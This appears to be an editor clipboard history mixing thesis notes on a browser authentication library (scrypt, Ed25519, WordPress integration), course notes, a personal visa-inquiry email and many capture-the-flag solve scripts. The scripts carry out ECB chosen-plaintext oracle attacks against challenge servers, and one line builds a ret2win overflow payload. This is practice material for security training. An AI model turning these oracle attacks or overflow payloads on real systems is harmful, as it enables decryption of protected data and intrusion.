	    - How smart contracts were analyzed to find bugs (high-level)
	
	CAPTCHA
	    - What is it, how can someone bypass it
	    - Not statistics
138848e0f8a20e554ba09affac47a7ab|file:///home/neo/Documents/epl682/notes/web-security.md|6|66|v|markdown
	instructing
4e98c881b9fb323926545b3a023edbff|file:///media/neo/Storage/mozilla-central/security/nss/lib/freebl/sha512.c|822|15|V|c
	    /* uint8_t buf[64]; */
	    /* bzero(buf,64); */
1572c6d9b8585e51959c0fa7ffd68f96|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/form_submit.js|13|1|V|javascript
	        // let signature = cred.substr(64);
	        // let submitVals = {};
	        // submitVals["public_key"] = cred.substr(0,64);
	        // submitVals["signature"] = cred.substr(64);
	        // let submitJson = JSON.stringify(submitVals);
b7d5763c41f7597969ada07dc9a26f68|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/form_submit.js|13|9|V|javascript
	        console.log(cred)
a92e3a8116091927a2dc56b1df82187f|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/form_submit.js|13|40|v|javascript
	 //change the typed password with the correct credential
7ff9a2636697e63be6198921044a140c|file:///home/neo/Documents/epl682/notes/social-networks.md|19|1|V|markdown
	- The system checks for a set of similar messages and requires that a significant subset of these violate the behavioral profiles-
8ea109218c83f16f501594e79da0b5a7|file:///home/neo/Documents/epl682/notes/social-networks.md|22|1|V|markdown
	- Very resource intensive for attacker to post customised messages - doesnt scale
9b2f65697faf279c0fdeb4f4e04223c1|file:///home/neo/Documents/epl682/notes/all.md|8|12|v|markdown
	encapsulated
1c9604c79490ee817758038e3e2cc448|file:///home/neo/Documents/epl682/notes/all.md|10|1|V|markdown
	web security:
9e7bd4cbb7b03fd4ab274d273250784a|file:///tmp/neomutt-neo-1000-2491-2234304458850746327|1406|1|V|mail
	I am a Cypriot citizen and I got accepted into a PhD program in the US,<br>
	starting in August. I have a couple of questions regarding the issuance<br>
	of a non immigrant visa.<br>
	<br>
	First of all, in my I-20 form, it is mentioned that one of the required<br>
	documents for getting a visa approved is information that proves that I<br>
	intend to return to my home country after finishing my studies. What<br>
	would be some examples of such a document.<br>
	<br>
	Secondly, in the website of the US embassy in Cyprus, it is mentioned<br>
	that currently all visa appointments are cancelled. Is there any update<br>
	on when the visa appointments will be resumed? Also, will I be able to<br>
	apply for an expedited appointment once the appointments are resumed?<br>
1be2dfb6eff614f77060eca600899c15|file:///tmp/neomutt-neo-1000-32432-16296252272291714150|239|1|V|mail
	> I am a Cypriot citizen and I got accepted into a PhD program in the US,
	> starting in August. I have a couple of questions regarding the issuance
	> of a non immigrant visa.
	> 
	> First of all, in my I-20 form, it is mentioned that one of the required
	> documents for getting a visa approved is information that proves that I
	> intend to return to my home country after finishing my studies. What
	> would be some examples of such a document.
	> 
	> Secondly, in the website of the US embassy in Cyprus, it is mentioned
	> that currently all visa appointments are cancelled. Is there any update
	> on when the visa appointments will be resumed? Also, will I be able to
	> apply for an expedited appointment once the appointments are resumed?
4006335442ebeef84660cec2bd3b67af|file:///home/neo/Documents/thesis/notes.txt|1|4|v|text
	Usual
5ba3205251522e793017b3af03c607ce|file:///home/neo/Documents/thesis/notes.txt|7|77|v|text
	agreement
5f037e61c166e608fb992fa17d7410aa|file:///home/neo/CTFs/ccsc2020/eclectic_dishonor/writeup.md|91|3|v|markdown
	echo -n T4/kgWrnuIKfx1sIYGYFPwDKwp6rKi7/D1xKyGO7Zon1MJEPMZTccx3eUWgr2Koo | base64 -d > message3.bin
71e3b3212c34717c5b6b381288942988|file:///home/neo/Documents/thesis/notes.txt|50|507|v|text
	In the last
32d3bdbeb2768a71ce5db7ec3e19b2c2|file:///home/neo/Documents/thesis/notes.txt|62|5|V|text
	    - We wanted to add auth.js to one of the most famous CMSs as a proof-of-concept
4c3bc1b0b911e9a5de540dd69f583b2a|file:///home/neo/Documents/thesis/notes.txt|63|5|V|text
	    - Added saving public key in database, creating nonce (as csrf token),parsing for getting message/public key and verifying signatures as a python script and auth.js to stop form submission and change credential value as seen previously
ba9bf05693b9fa202d922dd43a08f281|file:///home/neo/.config/youtube-dl/config|1|1|v|
	youtube
d17a93145bb547e5103e03eceea0b98b|file:///home/neo/ropemporium/ret2win/exploit.py|55|1|V|python
	payload = "A" * OFFSET + p64(RET2WIN_ADDR+0x04)
b5a197c4704d1f496e35fe4f6d5d14a4|file:///home/neo/ropemporium/ret2win/exploit.py|51|1|V|python
	print(RET)
1f129c42de5e4f043cbd88ff6360486f|untitled:1|3|35|v|
	somestring
cb15446e9d5b8579ea3f3efbba734ddc|untitled:1|1|1|V|
	OUTPUT=0; 
	while [ "$OUTPUT" = 0 ]; do 
	  OUTPUT=`./reliability | grep -c LAMBDA`;
	done
	echo $OUTPUT
50a87f0d71f7221582dad4bf507a0f34|untitled:1|6|8|v|
	OUTPUT
cb9ef4196c1705e63417dbeb1daa22a1|untitled:1|1|1|V|
	OUTPUT=0; 
	while [ "$OUTPUT" = 0 ]; do 
	    RESULT=`./reliability` 
	    OUTPUT=`echo "$RESULT" | grep -c LAMBDA`;
	done
	echo "$RESULT"
ff2b861dae5330de29f2d3ca29020680|file:///home/neo/Documents/thesis/notes.txt|10|1|V|text
	    - ŒüœÖœÉŒπŒ±œÉœÑŒπŒ∫Œ¨ Œ∏Œ≠ŒªŒøœÖŒºŒµ Œø server ŒΩŒ± œÄœÅŒ≠œÄŒµŒπ ŒΩŒ± Œ∫Œ¨ŒΩŒµŒπ brute force to find out a user's password, and we want the brute force to be as slow for the attacker as possible (it's like we assume that the database was leaked and the attacker has to brute force the hashes to find out the passwords). We will see two cryptographic primitives that can help us achieve this goal
01b1deea54bddf10d121eba1fc78e353|file:///home/neo/Documents/thesis/notes.txt|14|5|V|text
	    - because it is memory intensive, it can make the brute force process very slow.
43ff167cf9c10a8797da4e310cc5936b|file:///home/neo/Documents/thesis/notes.txt|15|1|V|text
	    - Scrypt: password-based key derivation function.
7a9313c6b9b164640a0d1da3277bc9c2|file:///home/neo/Documents/thesis/notes.txt|16|5|V|text
	    - Can also adapt its memory use as machines get more powerful by tuning some input parameters
5c33a6a4b779c5c989ad3a6d530b7091|file:///home/neo/Documents/thesis/notes.txt|14|7|v|text
	Can also adapt its memory use as machines get more powerful by tuning some input parameters
80d1c06a2ee2b9c79c3ea7281db031e1|file:///home/neo/Documents/thesis/notes.txt|14|1|V|text
	    - Legitimate users only need to perform the function once per operation, so the time required is negligible
ed3282dea6ce47482499563401ba7ce2|file:///home/neo/Documents/thesis/notes.txt|15|7|v|text
	In a brute force attack the operation would need to be performed billions of times, so the time required is signifigant
7d63f3760395d5f4b00bffd4c5da6840|file:///home/neo/Documents/thesis/notes.txt|21|1|V|text
	    - Attacker would firstly have to find the private key and then brute force the scrypt hash to find the user's password
f766bbe26dedd13f184defe5d836329e|file:///home/neo/Documents/thesis/notes.txt|38|1|V|text
	Keybase website uses client-side code implemented in JavaScript to get the scrypt hash of the typed password
5bde81427a242e293819cfa33d922a40|file:///home/neo/Documents/thesis/notes.txt|36|1|V|text
	Problem: code not trusted:
477ac5f75597000ee55b0400d629b361|file:///home/neo/Documents/thesis/notes.txt|88|1|V|text
	12. Wordpress
e3ad2f2e8b457684550a1c2e1b4d211c|file:///home/neo/Documents/thesis/notes.txt|16|1|V|text
	Goal:
	    - ŒüœÖœÉŒπŒ±œÉœÑŒπŒ∫Œ¨ Œ∏Œ≠ŒªŒøœÖŒºŒµ Œø server ŒΩŒ± œÄœÅŒ≠œÄŒµŒπ ŒΩŒ± Œ∫Œ¨ŒΩŒµŒπ brute force to find out a user's password, and we want the brute force to be as slow for the attacker as possible
	    - (it's like we assume that the database was leaked and the attacker has to brute force the hashes to find out the passwords).
	    - We will see two cryptographic primitives that can help us achieve this goal
	
d60464c57b1fcf8ae87308b0bdeea797|file:///home/neo/Documents/thesis/notes.txt|31|1|V|text
	Figure:
72fc3eb8819f737046675f648718a396|file:///home/neo/Documents/thesis/notes.txt|31|1|V|text
	    - A part of the scrypt hash is interpreted as an Ed25519 private key and the corresponding public key is generated 
	    - This public key is the user‚Äôs credential, and is sent to the server
	    - To authenticate, the user‚Äôs client signs a message with the user‚Äôs private key and server verifies the signature using the stored public key
50fa88fd3e7c2afc82460d10bb10e609|file:///home/neo/Documents/thesis/notes.txt|30|1|V|text
	    - Keybase website uses client-side code implemented in JavaScript to get the scrypt hash of the typed password
b2075ba110944febff9db09f9c849371|file:///home/neo/Documents/thesis/notes.txt|48|1|V|text
	10. Contributions:
5bbbcae5c96f0b4793255bb9c59d1fe8|file:///home/neo/Documents/thesis/notes.txt|68|3|v|text
	 Extending firefox
4da54eb2b285bd27bb6727a11fc4ef50|file:///home/neo/Documents/thesis/notes.txt|8|5|V|text
	    - Advanced authentication schemes (e.g. PAKE(Password authenticated key exchange)-like protocols) - allows parties to exchange a shared key based on one's party knowledge of a password - the server doesn't directly know the user's password, but the user can still prove knowledge of the password and authenticate
60bb1146bbf2aded4d5c8914ff7d4232|file:///home/neo/Documents/thesis/notes.txt|12|5|V|text
	    - PAKE: many pake-like protocols exist that allow a party to authenticate to a server
a8cf19bcd01513ba0a05e59cba247311|file:///home/neo/Documents/thesis/notes.txt|10|5|V|text
	    - Algorithms exist that allow a user to authenticate with a server without revealing their password
a5d264df1f7db7c72d6cde552060f845|file:///home/neo/Documents/thesis/notes.txt|25|1|V|text
	6. Keybase:
	    - A service which offers cryptographic services to its clients (like end-to-end encrypted chat, encrypted filesystem etc.) and has a different than usual authentication mechanism
	    - Keybase website uses client-side code implemented in JavaScript to get the scrypt hash of the typed password
	    - Keypair generated on the fly each time, based on the password that the user typed
	    - Keybase is opensource and probably doesn't do anything shady, but we can't trust that all websites implement the authentiation scheme correctly
fe0f8a2767238698f2ca27d6e7577e37|file:///home/neo/Documents/thesis/notes.txt|1|1|V|text
	1. Conventional password authentication:
	    - When a user registers, his password is hashed and stored in a database
	    - When they want to authenticate, they send their password, usually over an encrypted channel
	    - it is hashed with the same hash function and checked against the stored hash
	
	2. Server knows user's password:
	    - ŒòŒ≠ŒªŒøœÖŒºŒµ ŒΩŒ± ŒºŒ∑ŒΩ ŒºœÄŒøœÅŒµŒØ Œø server ŒΩŒ± Œ∫Œ¨ŒΩŒµŒπ login œÉŒµ Œ∫Œ¨œÄŒøŒπŒø Œ¨ŒªŒªŒø account œÑŒøœÖ œáœÅŒÆœÉœÑŒ∑ ŒºŒµ œÑŒø credential œÄŒøœÖ œÑŒøœÖ Œ±œÄŒøœÉœÑŒ≠ŒªŒªŒµŒπ Œø œáœÅŒÆœÉœÑŒ∑œÇ
	
	3. Alternative authentication methods:
	    - Public key authentication: Server can't login another service, since it only knows the public key but would need the private key to authenticate.
	    - Advanced authentication schemes (e.g. PAKE(Password authenticated key exchange)-like protocols) - allows parties to exchange a shared key based on one's party knowledge of a password - the server doesn't directly know the user's password, but the user can still prove knowledge of the password and authenticate
	    - Rarely deployed, probably due to the complex underlying cryptography
	    - Difficult for an average web programmer to correctly implement such a scheme in their web app
	
	4. Keybase:
	    - A service which offers cryptographic services to its clients (like end-to-end encrypted chat, encrypted filesystem etc.) and has a different than usual authentication mechanism
	    - Keybase website uses client-side code implemented in JavaScript to get the scrypt hash of the typed password
	    - Keypair generated on the fly each time, based on the password that the user typed
	    - Keybase is opensource and probably doesn't do anything shady, but we can't trust that all websites implement the authentiation scheme correctly
	
	5. Scrypt:
	    - Scrypt: password-based key derivation function. (created with the purpose of deriving secrets based on a given password, designed to be computationally intensive on purpose )
	    - Legitimate users only need to perform the function once per operation, so the time required is negligible
	    - In a brute force attack the operation would need to be performed billions of times, so the time required is signifigant
	    - By tuning the parameters to make it more intensive, we can adapt to new, more advanced hardware
	
	6. Ed25519:
	    - ECC: We have a point on an elliptic curve, multiply it by a number k, which is the private key, and we get a new point. Given the two points, it is really hard to find the number k
	    - EdDSA: uses elliptic curve cryptography to sign messages
	
	
	7. Problem: code not trusted:
	    - A malicious site can purposefully not implement the algorithm correctly
	    - Advertise that it uses an advanced authentication system to attract users
	    - Maybe error in complex underlynig cryptography if web programmer implements the whole system by themselves
	    - User thinks they don't send their actual password, but they still do
	
	8. Goal:
	    - ŒüœÖœÉŒπŒ±œÉœÑŒπŒ∫Œ¨ Œ∏Œ≠ŒªŒøœÖŒºŒµ Œø server ŒΩŒ± œÄœÅŒ≠œÄŒµŒπ ŒΩŒ± Œ∫Œ¨ŒΩŒµŒπ brute force to find out a user's password, and we want the brute force to be as slow for the attacker as possible
	    - (it's like we assume that the database was leaked and the attacker has to brute force the hashes to find out the passwords).
	    - We will see two cryptographic primitives that can help us achieve this goal
	
	9. auth.js
	    - Provides 3 API calls, will see them next
	    - Solves both problems: if web programmer chooses to use an advanced authentication scheme, the user can be certain that the server can't steal their password. Because auth.js uses browser's engine to perform cryptographic operations, we are sure that the authentication is executed securely (unless browser is compromised)
	    - Any authentication scheme can be added as long as the browser supports the necessary cryptographic primitives
	
	
	10. API calls
	    - InitializeCredentialType: used to choose the authentication scheme that will be used and other options about the credential (for now the length of the password). Takes as input a json object that describes the credential. The passwordProcessMethod parameter determines the authentication scheme (plain or scrypt_seed_ed25519_keypair)
	    - register and authenticate API calls change the value of the typed password to the value of the corresponding credential (e.g for keybase-like authentication, for registration the credential will be the public key, and for authentication the public key concatenated with the signature of the message). Then the credential will be submitted
	
	11. Architecture (example for registration with keybase-like authentication scheme):
	    1) The user requests the website from the server as usual
	    2) The server returns the html source for the website. In the source, the client is directed to retrieve auth.js from a trusted third party, like a CDN. The server could also send auth.js themselves, but it is more secure to retrieve it from a trusted source. Also, in the JavaScript source of the website, the options for the authentication scheme are initialized. In this case the keybase-like authentication scheme will be used
	    3) and 4) The client retrieves auth.js from a trusted third party
	    5) auth.js will use the client's browser to change the password the user typed into the corresponding credential, in this case an Ed25519 public key.
	    6) The credential is submitted to the server, along with other necessary information for registration, like the username
	
	12. Example code snippet, where auth.js is used to change the value of the typed password into the correct credential
	    - First, form registration is paused
	    - initializeCredentialType API call is used to set the options for the authentication scheme
	    - Keybase-like scheme is chosen
	    - The typed password and the nonce that will be signed are retrieved from the page. In this case, the message to be signed is impemented as a csrf nonce. We want the message to be different every time, to prevent replay attacks etc.
	    - the authenticate API call is used to sign the generate the Ed25519 keypair based on the typed password and sign the message. The pubic key and signature are returned as the credential
	    - The submitted value is changed to this credential
	
	13. Implementation
	    - The cryptographic primitives we needed did not exist in firefox
	    - NSS: firefox's cryptographic library
	    - Web crypto api: firefox's javascript api which provides calls to cryptographic primitives, which are executed using the broswer's engine (NSS)
	
	14. Example code snippet from NSS.
	    - Specifically, this is one of the functions that is called when an scrypt hash has to be created.
	    - Scrypt takes some input parameters (N, p, r) which tune how memory-intensive the operation will be (so we can make it more intensive as time passes and computers become more powerful).
	    - We use some default values for these parameters and for the salt, but when scrypt gets impelemented correctly in firefox the user should be able to set these values from the web crypto api. 
	    - In the last line, the function from the preexisting scrypt implementation is called and creates the scrypt hash.
	
	15. Examples from auth.js where web crypto api is used to call the newly added cryptographic primitives
	    - First: scrypt is called to create the hash of the user's password
	    - Second: as said before, implemented Ed25519 as digest functions. This one is the function which takes the private key and returns the corresponding public key
	    - Third: this one takes as input the keypair and the message to be signed and returns the signed messsage
	
	16. Deployment:
	    - We wanted to test how easy it is to include auth.js in a popular CMS
	    - Added saving public key in database, creating nonce (as csrf token),parsing for getting message/public key and verifying signatures as a python script and auth.js to stop form submission and change credential value as seen previously
	    - Of course, if the authentication scheme changes the existing passwords must be reset (e.g. changed to public keys)
	    - Changes: auth.js changes submitted values, addition of a nonce as a message to be signed, verification of signature
	
	17. New authentication function in Wordpress
	    - Get original nonce value from cookie (which is the message which was signed)
	    - Split credential to get public key and signature
	    - Check if public key matches stored public key
	    - Call the python script to verify the signature
	
	18. Evaluation:
	    - Timings for creating and posting key pairs and signatures
	    - Left: posting, right: creating
	    - Timings on an unoptimized browser (for debuggin reason)
	    - ŒïŒΩŒ¥ŒµŒπœáœÑŒπŒ∫Œ≠œÇ œÑŒπŒºŒ≠œÇ
	    - We actually want some overhead on creating the credential, that's why we use scrypt, a memory intensive hash function
	
	19. Conclusion
	    - We hope that more authentication schemes will be added in the future, and that browsers will implement more cryptographic primitives, in order to be able to support more advance cryptographic schemes
	    - Solves both the problem that the server can have access to the user's password, and that we want cryptographic operations to be executed in a secure context
3b980fbb5aaf59fb27eaff5baaed723e|file:///home/neo/hackthebox/mobile/hackthebox.app/_CodeSignature/CodeResources|9|3|v|xml
	4WPVRXS4vEzeNfkiGBpgukr2nhI
e003d39776383801c9f75b682a162032|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|19|1|V|python
	eliminated = {} for i in range(20):
	    eliminated[i] = set()
	
	r.recvuntil('No leaks\n')
	for i in range(2000):
	    json_send({'msg': 'request'})
	    response = json_recv()
	    if 'ciphertext' in response:
	        ciphertext = base64.b64decode(response['ciphertext'])
	        for i, c in enumerate(ciphertext):
	            eliminated[i].add(c)
	
	# print(eliminated[0])
	flag = ''
	for i in range(20):
	    elim = eliminated[i]
	    for c in string.printable:
	        if ord(c) not in elim:
	            flag += c
	            break
	
	print(flag)
fb4f1fe2c1ec5948b0c09b0a57887671|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|8|1|V|python
	# r = remote('socket.cryptohack.org', 13370, level = 'debug')
ac98e27c699de8448117a93f853279fa|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|9|1|V|python
	r = remote('chals20.cybercastors.com', 14420)
80f652a9528039220ccb2783d060c829|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|7|1|V|python
	    block_size = 16
	    decrypted = ''
	    hex_a = hex(ord('a'))[2:] 
3cd0d6eadbd8be9975044c915daa6e21|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|23|1|V|python
	    for i in range(2 * block_size):
	        r = requests.get(url= URL + pre_append + '/') 
	        enc = bytes.fromhex(r.json()['ciphertext'])[block_size:]
	        target = enc[block_size: 2 * block_size]
	        # print('Target: ', target)
	        prefix = (16 * hex_a) + (2 * block_size - i - 1) * hex_a + ''.join("{:02x}".format(ord(c)) for c in decrypted)
	        # print(prefix)
	        for c in string.printable:
	            # print(prefix + hex(ord(c))[2:])
	            r = requests.get(url= URL + prefix + hex(ord(c))[2:] + '/') 
	            enc = bytes.fromhex(r.json()['ciphertext'])[block_size:]
	            # print(enc)
	            output = enc[block_size: 2 * block_size]
	            # print(output)
	            if output == target:
	                decrypted += c
	                print(decrypted)
	                break
	        pre_append = pre_append[:-2]
	    print(decrypted)
f85f081301463eadb9f3b6f7f9d4df73|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|27|5|V|python
	    r = requests.get(url= URL + pre_append + '/') 
305b0b5a11249c05f18900a78375531b|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|23|11|V|python
	r.recvuntil('choice: ')
	r.sendline('1')
	r.recvline()
2fd0114c26a1443b480c88643acf7bf0|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|26|5|V|python
	    r.recvline()
d8359c080e8c98e13f41ebac22cfb915|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|11|1|V|python
	def json_recv():
	    line = r.recvline()
	    return json.loads(line.decode())
	
	def json_send(hsh):
	    request = json.dumps(hsh).encode()
	    r.sendline(request)
c3618acf6db0ab4082a8dc70e944ae56|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|3|1|V|python
	import codecs
407743bfa482716c76ece3addf02517f|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|22|1|V|python
	    pre_append = (16 * hex_a) + (block_size * 2 - 1) * hex_a
14038ff9cb81960790d2fcb9e09f198b|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|12|20|v|python
	hex_a
594f8242bb22c2c72ed0a717834c467b|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|17|1|V|python
	    r.recvuntil('choice: ')
	    r.sendline('2')
	    r.recvline()
	    r.sendline(pre_append)
	    r.recvuntil('bytes:\n')
	    line = str(r.recvline())[2:-3]
	    enc = bytes.fromhex(line)
b418da5656ed37651abb2361dbeb72c7|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|21|1|V|python
	hex_a = hex(ord('a'))[2:] 
a8764bf5bbb3bdb638e410bc72bae9bc|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|27|56|v|python
	''.join("{:02x}".format(ord(c)) for c in decrypted)
6c690e85e8f76042ad819b52744c2a02|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|30|9|V|python
	        # print(prefix + hex(ord(c))[2:])
0897f2ea0d350330d962626f5f74e398|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|28|5|V|python
	    # print(prefix)
ddaa22f45222b6fe6ac30ac2f40a48db|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|26|5|V|python
	    # print('Target: ', target)
00aba30c8a8ad4ac1106f7a8d74168b7|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|5|1|V|python
	def send_flag(prepend):
	    r.recvuntil('choice: ')
	    r.sendline('2')
	    r.recvline()
	    r.sendline(pre_append)
	    r.recvuntil('bytes:\n')
	    line = str(r.recvline())[2:-3]
	    ct = bytes.fromhex(line)
	    return ct
a3a6a0380a324d806e2f3843ba337225|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|14|17|v|python
	pre_append
ef77c254ce0c9b183b22e9f596fae7cd|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|36|9|V|python
	        r = requests.get(url= URL + prefix + hex(ord(c))[2:] + '/') 
47bced40da6cadfb287b894f05b44daf|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|32|32|v|python
	[block_size:]
a11d4436d054b90a3a3ef7b2f673c96b|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|33|18|^v|python
	(i % block_size) 
f19d0d45ece709134c50b575ef56601c|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|11|5|V|python
	    ct = bytes.fromhex(line)
66deaeca9e1c1e28245809daba17d7dd|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|37|14|V|python
	        output = enc[block_size: 2 * block_size]
	        # print(output)
d52e92eac2c518a36655b22b05d7ef92|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|31|19|v|python
	 (5 - i % block_size + 1) * block_size
299839442cff5b24f62903b35bbe4dfc|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|31|5|V|python
	    target = enc[:i]
f7145d1c31e567a0afbb2d79c21e5bdf|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|31|5|V|python
	    curr_block = (i-1) // block_size
e9725dfa923e11c2c7a6881e2f06929f|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|33|5|V|python
	    print(curr_block)
ad449a021bd12eebfad3ffc0b00e33a3|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|37|9|V|python
	        print(prefix+c)
472732d9e8c4ce76b1fb55632bd504d3|file:///home/neo/CTFs/castor2020/bagel/server.py|32|1|V|python
	        return s + bytes([pad_b]) * pad_b
	
4519307097b901bf82058d196677eb85|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|31|5|V|python
	    print(pre_append)
9778772bb0af954ac67a07799e0145a2|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|31|5|V|python
	    curr_byte += 1
7f114ee1d64a535c275bc91425706b0b|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|34|35|v|python
	[:curr_block * block_size]
bbcd2ee71bc34fefadbc5c3ab0f10c42|file:///home/neo/CTFs/castor2020/bagel/decrypt.py|27|1|V|python
	decrypted = 'castorsCTF{I_L1k'
e9acb70fad73992be2bd2c9a21f28a83|file:///home/neo/CTFs/castor2020/flaggodds/decrypt.py|4|1|V|python
	def send_flag(pre_append):
	    r.recvuntil('choice: ')
	    r.sendline('2')
	    r.recvline()
	    r.sendline(pre_append)
	    r.recvuntil('bytes:\n')
	    line = str(r.recvline())[2:-3]
	    return bytes.fromhex(line)
	
	def send_custom(pt):
	    r.recvuntil('choice: ')
	    r.sendline('1')
	    r.recvline()
	    r.sendline(pt)
	    r.recvuntil('bytes:\n')
	    line = str(r.recvline())[2:-3]
	    return bytes.fromhex(line)
00a0d1edf293c0e5d0d819ccb739a9f0|file:///home/neo/CTFs/castor2020/flaggodds/decrypt.py|5|1|V|python
	  """
	  :type x: int
	  :type y: int
	  :rtype: int
	  """
04581e9b874306efa8ad717e163eabad|file:///home/neo/CTFs/castor2020/flaggodds/decrypt.py|10|20|V|python
	     #if not(b1==b2):
	        # print(b1,b2,i)
968f9b135f6fbe4649f636dc9f595fc0|file:///home/neo/CTFs/castor2020/flaggodds/decrypt.py|13|1|V|python
	# r = remote('chals20.cybercastors.com', 14420, level = 'debug')
1f8be445d0a4bac7d4d66b72577ca1e4|file:///home/neo/CTFs/castor2020/flaggodds/decrypt.py|13|1|V|python
	
	block_size = 16
	curr_byte = 0
	decrypted = 'castorsCTF{I_L1k3_muh_b4G3l5_3x7'
cdb642ab69e7c92dfc2e7819db92d20b|file:///home/neo/CTFs/castor2020/flaggodds/decrypt.py|14|1|V|python
	pre_append = (block_size - 1) * 'a'
	for i in range(block_size):
	    curr_block = 3 - (curr_byte // 16)
	    curr_byte += 1
	    target = send_flag(pre_append)[:curr_block*block_size]
	    # print(target)
	    prefix = (block_size - i - 1) * 'a' + decrypted
	    for c in string.printable:
	        # print(prefix+c)
	        enc = send_custom(prefix + c)
	        # print(enc)
	        if enc == target:
	            decrypted += c
	            print(decrypted)
	            break
	    pre_append = pre_append[:-1]
	print(decrypted)
98958d82f4798e92639ad8128028bb25|file:///home/neo/CTFs/castor2020/flaggodds/decrypt.py|15|1|V|python
	r.recvuntil('calibrated.\n')
f92fbc8ab699799dc2800c7cce24c6a2|file:///home/neo/CTFs/castor2020/flaggodds/decrypt.py|18|11|V|python
	for c in msg: 
	    print(c)
449e883b4fc66c610571a7f8da2929b1|file:///home/neo/CTFs/castor2020/flaggodds/decrypt.py|19|1|V|python
	print(hex_msg)
31f964dcf43e349ad45b124adc9e793a|file:///home/neo/CTFs/castor2020/flaggodds/decrypt.py|19|1|V|python
	# hex_msg = bytes.fromhex(str(r.recvline()))
a05e7954147c7e6e11e894f405338053|file:///home/neo/CTFs/castor2020/flaggodds/decrypt.py|19|15|V|python
	print(len(msg))
	print(len(hex_msg))
cefd8dbf6537b966939203d831af7fc7|file:///home/neo/CTFs/castor2020/flaggodds/decrypt.py|22|1|V|python
	print(dist)
58b0aca6b7a98317d8f2095428f671ca|file:///home/neo/CTFs/castor2020/flaggodds/decrypt.py|12|1|V|python
	r = remote('chals20.cybercastors.com', 14431)
06613d6f9261610de068f242a73a48c9|file:///home/neo/CTFs/castor2020/flaggodds/decrypt.py|25|1|V|python
	r.recvline()
	r.recvline()
	r.recvline()
	r.recvline()
	r.recvline()
81e4b82a7bc922372107d48163b76c57|file:///home/neo/CTFs/castor2020/magicschool/decrypt.py|3|1|V|python
	
	def send_flag(pre_append):
	    r.recvuntil('choice: ')
	    r.sendline('2')
	    r.recvline()
	    r.sendline(pre_append)
	    r.recvuntil('bytes:\n')
	    line = str(r.recvline())[2:-3]
	    return bytes.fromhex(line)
	
	def send_custom(pt):
	    r.recvuntil('choice: ')
	    r.sendline('1')
	    r.recvline()
	    r.sendline(pt)
	    r.recvuntil('bytes:\n')
	    line = str(r.recvline())[2:-3]
	    return bytes.fromhex(line)
17440bb1fa5f9abe6a25edeaf5d3a376|file:///home/neo/CTFs/castor2020/magicschool/decrypt.py|7|1|V|python
	block_size = 16
	curr_byte = 0
	decrypted = 'castorsCTF{I_L1k3_muh_b4G3l5_3x7'
	
	pre_append = (block_size - 1) * 'a'
	for i in range(block_size):
	    curr_block = 3 - (curr_byte // 16)
	    curr_byte += 1
	    target = send_flag(pre_append)[:curr_block*block_size]
	    # print(target)
	    prefix = (block_size - i - 1) * 'a' + decrypted
	    for c in string.printable:
	        # print(prefix+c)
	        enc = send_custom(prefix + c)
	        # print(enc)
	        if enc == target:
	            decrypted += c
	            print(decrypted)
	            break
	    pre_append = pre_append[:-1]
	print(decrypted)
bc8126021d28f83f91757509629a8de3|file:///home/neo/CTFs/castor2020/magicschool/decrypt.py|11|1|V|python
	print(len(ct))
1f37d5a46df7606aa858bb5b684b041c|file:///home/neo/CTFs/castor2020/magicschool/decrypt.py|17|5|V|python
	    print(send)
f07fe75995a76944517a67a9d1589344|file:///home/neo/CTFs/castor2020/magicschool/decrypt.py|20|5|V|python
	    r.recv
a39c28e50487bb68cabe6365fce0d103|file:///home/neo/CTFs/castor2020/magicschool/decrypt.py|9|1|V|python
	r.recvuntil('seating: ')
	ct = str(r.recvline())[2:-3]
07bc7649bb91831cf48260645a5780ec|file:///home/neo/CTFs/castor2020/magicschool/decrypt.py|23|5|V|python
	    print(seating)
0a819c20027136ad189e13cddb7dc010|file:///home/neo/CTFs/castor2020/stalk/decrypt.py|7|1|V|python
	r.recvuntil('choice: ')
	r.sendline('2')
	r.recvuntil('seating: ')
	ct = str(r.recvline())[2:-3]
	
	flag = ''
	pt = ["A"] * 46
	for i in range(len(ct)):
	    r.sendline('1')
	    r.recvuntil('bus?: ')
	    pt[i] = "B"
	    send = ''.join(pt)
	    r.sendline(send)
	    r.recvuntil('seating: ')
	    seating = str(r.recvline())[2:-3]
	    seat = seating.index("B")
	    flag += ct[seat]
	    print(flag)
	    pt[i] = "A"
	
	print(flag)
	
6b0f424e15f477b0c066d10949a47ddb|file:///home/neo/CTFs/castor2020/stalk/server.py|21|1|V|python
